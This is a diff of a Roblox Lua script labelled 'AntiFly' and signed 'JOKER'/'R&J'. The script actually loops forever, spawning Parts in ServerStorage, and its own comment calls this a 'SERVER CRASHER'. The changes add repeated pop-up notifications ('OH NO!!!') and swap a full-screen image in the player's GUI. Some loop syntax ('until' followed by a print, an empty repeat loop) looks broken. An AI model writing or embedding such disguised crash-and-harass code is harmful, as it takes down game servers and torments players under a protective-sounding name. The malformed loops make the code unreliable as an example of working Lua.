@@ -1,5 +1,7 @@
 --AntiFly = THE R&J CORE!! 
 
+
+
 local foldername = "JOKER"
 local p = script.Parent.Parent.PlayerGui
 --Warning texts 
@@ -304,7 +306,20 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 --the parts creator (VERY IMPORTANT)
 
 repeat
-	--SERVER CRASHER-- (I dont know is this will be overload the server storage in 10 mins)
+	
+	local A = "OH NO!!!" or "YOU LIKE THIS?"
+	local B = "rbxassetid://12779093377" or "rbxassetid://11560341824"
+	local C = 4 or 9 or 7
+
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = A; 
+		Text = "''By R&J''";
+		Icon = B; 
+		Duration = C; 
+	})
+	wait(7)
+	
+	
 	Instance.new("Part", game.ServerStorage)
 	Instance.new("Part", game.ServerStorage)
 	wait(0)
@@ -313,7 +328,7 @@ repeat
 	w.Text = math.random(1,90000)
 	
 	
-	
+	--SERVER CRASHER-- (I dont know is this will be overload the server storage in 10 mins)
 	
 	local M1 = math.random(1,2)
 	
@@ -387,7 +402,7 @@ repeat
 		
 		
 		
-		p.ScreenGui.ImageLabel.Image = "rbxassetid://4749623118"
+		p.ScreenGui.ImageLabel.Image = "rbxassetid://9179833499"
 		
 		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
 		
@@ -533,11 +548,14 @@ repeat
 until
 
 print("HELLO")
+wait(3)
+repeat
 
-
+until
 
 
 
 --an message (console)
 
 print("BY-THE-JOKER")
+
